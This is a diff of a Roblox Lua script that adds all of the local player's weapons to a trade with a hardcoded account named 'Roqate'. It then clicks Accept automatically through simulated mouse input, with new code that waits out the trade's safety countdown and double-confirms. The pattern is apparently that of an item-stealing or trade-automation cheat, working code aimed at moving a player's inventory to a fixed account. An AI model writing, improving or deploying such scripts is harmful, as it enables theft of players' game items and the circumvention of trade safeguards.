@@ -1,5 +1,6 @@
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local VirtualInputManager = game:GetService("VirtualInputManager")
 local LocalPlayer = Players.LocalPlayer
 
 local TARGET_PLAYER = "Roqate"
@@ -72,9 +73,23 @@ local function findAcceptButton(gui)
     for _, btn in ipairs(gui:GetDescendants()) do
         if btn:IsA("TextButton") and string.find(string.lower(btn.Text), "accept") then
             return btn
+        elseif btn:IsA("TextButton") and string.find(string.lower(btn.Text), "please wait") then
+            return btn
         end
     end
     return nil
+end
+
+local function waitUntilAcceptEnabled(btn)
+    local startTime = os.clock()
+    while os.clock() - startTime < 15 do
+        local txt = string.lower(btn.Text)
+        if not string.find(txt, "please wait") then
+            return true
+        end
+        task.wait(0.5)
+    end
+    return false
 end
 
 local function waitForOtherAccept(gui)
@@ -88,6 +103,13 @@ local function waitForOtherAccept(gui)
         task.wait(0.3)
     end
     return false
+end
+
+local function clickButton(btn)
+    local pos = btn.AbsolutePosition + btn.AbsoluteSize/2
+    VirtualInputManager:SendMouseButtonEvent(pos.X, pos.Y, 0, true, nil, 0)
+    task.wait(0.05)
+    VirtualInputManager:SendMouseButtonEvent(pos.X, pos.Y, 0, false, nil, 0)
 end
 
 local function addAllItems(weapons)
@@ -107,7 +129,7 @@ local function doTradeCycle(targetPlayer)
     if not gui then return end
 
     addAllItems(weapons)
-    task.wait(0.5)
+    task.wait(0.3)
 
     local acceptBtn = findAcceptButton(gui)
     if not acceptBtn then
@@ -115,21 +137,21 @@ local function doTradeCycle(targetPlayer)
         return
     end
 
-    -- Click Accept once after adding
-    print("Clicking Accept")
-    game:GetService("VirtualInputManager"):SendMouseButtonEvent(acceptBtn.AbsolutePosition.X + 5, acceptBtn.AbsolutePosition.Y + 5, 0, true, nil, 0)
-    task.wait(0.1)
-    game:GetService("VirtualInputManager"):SendMouseButtonEvent(acceptBtn.AbsolutePosition.X + 5, acceptBtn.AbsolutePosition.Y + 5, 0, false, nil, 0)
+    print("Waiting for countdown to finish...")
+    if waitUntilAcceptEnabled(acceptBtn) then
+        print("Accept is enabled, clicking now")
+        clickButton(acceptBtn)
+    else
+        warn("Accept button never enabled!")
+        return
+    end
 
-    print("Waiting for other player to accept...")
+    print("Waiting for other player...")
     if waitForOtherAccept(gui) then
-        print("Other accepted → double-clicking Accept")
-        for i=1,2 do
-            game:GetService("VirtualInputManager"):SendMouseButtonEvent(acceptBtn.AbsolutePosition.X + 5, acceptBtn.AbsolutePosition.Y + 5, 0, true, nil, 0)
-            task.wait(0.05)
-            game:GetService("VirtualInputManager"):SendMouseButtonEvent(acceptBtn.AbsolutePosition.X + 5, acceptBtn.AbsolutePosition.Y + 5, 0, false, nil, 0)
-            task.wait(0.1)
-        end
+        print("Other accepted, double-clicking Accept")
+        clickButton(acceptBtn)
+        task.wait(0.1)
+        clickButton(acceptBtn)
     else
         warn("Timeout waiting for other player.")
     end
